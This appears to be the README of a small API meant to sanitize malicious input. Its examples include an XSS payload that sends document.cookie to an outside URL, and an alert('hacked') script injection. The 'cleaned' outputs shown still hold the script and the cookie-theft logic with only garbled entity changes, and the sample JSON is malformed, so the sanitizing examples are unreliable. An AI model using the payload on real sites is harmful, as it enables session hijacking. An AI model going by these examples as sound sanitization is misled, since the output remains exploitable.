# Malicious-Code-Sanitizer
An API/Library to Sanitize Malicious Code
Input : Malicious Code
Eg. '>&script>document.location= 'http://www.example.com/index.php?param='+document.cookie&/script>' 
Output : Cleaned Code
Eg. &script>document.location= 'http://www.example.com/index.php? param='+document.cookie&script>'  

API Structure : domain.com/sanitizestring/string="'>&script>alert("hacked");&/script>" 
JSON Response of API  : 
{ "BadString" : "'>&script>alert("hacked");</script>", 
"CleanedString":"&script>alert("hacked");</script>" 
}
